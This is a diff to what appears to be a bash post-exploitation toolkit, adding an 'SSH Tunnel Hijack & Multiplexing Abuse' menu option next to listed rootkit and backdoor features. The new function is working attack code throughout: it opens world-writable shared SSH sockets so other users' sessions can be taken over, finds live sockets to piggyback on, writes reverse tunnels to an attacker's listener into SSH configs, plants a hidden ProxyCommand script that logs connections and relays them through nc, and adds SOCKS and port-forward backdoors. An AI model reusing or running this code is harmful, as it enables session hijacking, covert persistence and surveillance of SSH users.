@@ -870,6 +870,110 @@ fi
     esac
 }
 
+sshTunnelHijack(){
+    echo " [*] SSH Tunnel Hijack & Multiplexing Abuse [*] "
+    echo ""
+    echo "  [1] ControlMaster Hijack — force shared sockets for all users"
+    echo "  [2] Piggyback existing session — list active sockets"
+    echo "  [3] Persistent reverse tunnel — inject into SSH config"
+    echo "  [4] ProxyCommand injection — log SSH connections"
+    echo "  [5] SSH config backdoor — attacker tunnel on every connection"
+    read -p "Choice [1-5]: " mode
+    case "$mode" in
+        1)
+            SSHD_CONFIG="/etc/ssh/ssh_config"; SOCKET_DIR="/tmp/.ssh-mux"
+            mkdir -p "$SOCKET_DIR"; chmod 777 "$SOCKET_DIR"
+            sed -i '/^\s*Control\(Master\|Path\|Persist\)/d' "$SSHD_CONFIG" 2>/dev/null
+            cat >> "$SSHD_CONFIG" <<SSHEOF6
+
+# System connection sharing
+Host *
+    ControlMaster auto
+    ControlPath ${SOCKET_DIR}/%r@%h:%p
+    ControlPersist 4h
+SSHEOF6
+            echo "[+] System-wide ControlMaster configured."
+            echo "    Sockets: ${SOCKET_DIR}/"
+            echo "    Hijack: ssh -S ${SOCKET_DIR}/user@host:22 user@host"
+            ;;
+        2)
+            echo "[*] Searching for active SSH multiplex sockets..."
+            FOUND=0
+            for sd in /tmp/.ssh-mux /tmp /run /var/tmp /root/.ssh /home/*/.ssh; do
+                [ -d "$sd" ] || continue
+                while IFS= read -r sock; do
+                    [ -S "$sock" ] && echo "  [SOCKET] $sock" && FOUND=$((FOUND+1))
+                done < <(find "$sd" -maxdepth 2 -name "*@*" -type s 2>/dev/null)
+            done
+            [ "$FOUND" -eq 0 ] && echo "  No sockets found. Use option [1] first."
+            echo "Found $FOUND socket(s). Hijack: ssh -S /path/to/socket user@host"
+            ;;
+        3)
+            read -p "Target SSH host: " target_host
+            read -p "Attacker's listener port on remote: " attacker_port
+            read -p "Local port to expose (default: 22): " expose_port; expose_port="${expose_port:-22}"
+            read -p "Target user (or 'all'): " target_user
+            if [ "$target_user" == "all" ]; then CF="/etc/ssh/ssh_config";
+            else
+                if [ "$target_user" == "root" ]; then HD="/root"; else HD="/home/$target_user"; fi
+                CF="$HD/.ssh/config"; mkdir -p "$HD/.ssh" 2>/dev/null; touch "$CF"; chmod 600 "$CF"
+            fi
+            if ! grep -qF "# tunnel-$target_host" "$CF" 2>/dev/null; then
+                printf "\n# tunnel-%s\nHost %s\n    RemoteForward %s 127.0.0.1:%s\n    ServerAliveInterval 60\n" "$target_host" "$target_host" "$attacker_port" "$expose_port" >> "$CF"
+            fi
+            echo "[+] Reverse tunnel injected into $CF"
+            echo "    On user's 'ssh $target_host': remote:$attacker_port -> local:$expose_port"
+            ;;
+        4)
+            read -p "Target user (or 'all'): " target_user
+            read -p "Log file (default: /var/tmp/.ssh_capture.log): " logfile; logfile="${logfile:-/var/tmp/.ssh_capture.log}"
+            PROXY_SCRIPT="/usr/local/sbin/.ssh-proxy"
+            cat > "$PROXY_SCRIPT" <<'PROXYEOF6'
+#!/bin/bash
+HOST="$1"; PORT="$2"; LOGFILE="PLACEHOLDER_LOG"
+echo "[$(date '+%Y-%m-%d %H:%M:%S')] SSH: ${USER}@${HOST}:${PORT} ppid=$PPID" >> "$LOGFILE" 2>/dev/null
+exec /usr/bin/nc -w 10 "$HOST" "$PORT"
+PROXYEOF6
+            sed -i "s|PLACEHOLDER_LOG|$logfile|g" "$PROXY_SCRIPT"; chmod +x "$PROXY_SCRIPT"
+            touch "$logfile"; chmod 666 "$logfile"
+            if [ "$target_user" == "all" ]; then CF="/etc/ssh/ssh_config";
+            else
+                if [ "$target_user" == "root" ]; then HD="/root"; else HD="/home/$target_user"; fi
+                CF="$HD/.ssh/config"; mkdir -p "$HD/.ssh" 2>/dev/null; touch "$CF"; chmod 600 "$CF"
+            fi
+            if ! grep -qF "ProxyCommand $PROXY_SCRIPT" "$CF" 2>/dev/null; then
+                printf "\n# system-proxy\nHost *\n    ProxyCommand %s %%h %%p\n" "$PROXY_SCRIPT" >> "$CF"
+            fi
+            echo "[+] ProxyCommand injected into $CF. Logs: $logfile"
+            ;;
+        5)
+            echo "  [a] SOCKS proxy  [b] Port forward  [c] Both"
+            read -p "Choice: " tt; SOCKS_PORT=""; LOCAL_FWD=""
+            case "$tt" in
+                a|c) read -p "SOCKS port (default: 1080): " SOCKS_PORT; SOCKS_PORT="${SOCKS_PORT:-1080}" ;;&
+                b|c) read -p "Local port: " lport; read -p "Remote host:port: " rhost; LOCAL_FWD="$lport $rhost" ;;
+            esac
+            read -p "Target user (or 'all'): " target_user
+            if [ "$target_user" == "all" ]; then CF="/etc/ssh/ssh_config";
+            else
+                if [ "$target_user" == "root" ]; then HD="/root"; else HD="/home/$target_user"; fi
+                CF="$HD/.ssh/config"; mkdir -p "$HD/.ssh" 2>/dev/null; touch "$CF"; chmod 600 "$CF"
+            fi
+            if ! grep -qF "# auto-tunnel" "$CF" 2>/dev/null; then
+                printf "\n# auto-tunnel\nHost *\n" >> "$CF"
+                [ -n "$SOCKS_PORT" ] && printf "    DynamicForward 127.0.0.1:%s\n" "$SOCKS_PORT" >> "$CF"
+                [ -n "$LOCAL_FWD" ] && printf "    LocalForward %s\n" "$LOCAL_FWD" >> "$CF"
+                printf "    ExitOnForwardFailure no\n" >> "$CF"
+            fi
+            echo "[+] Auto-tunnel config injected into $CF"
+            [ -n "$SOCKS_PORT" ] && echo "    SOCKS5 on 127.0.0.1:$SOCKS_PORT"
+            [ -n "$LOCAL_FWD" ] && echo "    Forward: $LOCAL_FWD"
+            ;;
+        *) echo "[ERROR] Invalid choice" >&2; return 1 ;;
+    esac
+    sleep 1; clear
+}
+
 banner() {
     rainbow "
                                   ,
@@ -919,6 +1023,7 @@ menu() {
                                   [24] Package Manager Backdoor (.deb)
                                   [25] Depmod Stealth (Hide from modules.dep)
                                   [26] Namespace Jail (Container-Based Rootkit)
+                                  [27] SSH Tunnel Hijack & Multiplexing Abuse
 
     [*] Coming soon others features [*]
 
@@ -980,6 +1085,8 @@ EOF
         depmodStealth
     elif [ "$MENUINPUT" == "26" ] || [ "$MENUINPUT" == "26" ]; then
         namespaceJail
+    elif [ "$MENUINPUT" == "27" ] || [ "$MENUINPUT" == "27" ]; then
+        sshTunnelHijack
     else 
         echo "This option does not exist"
     fi
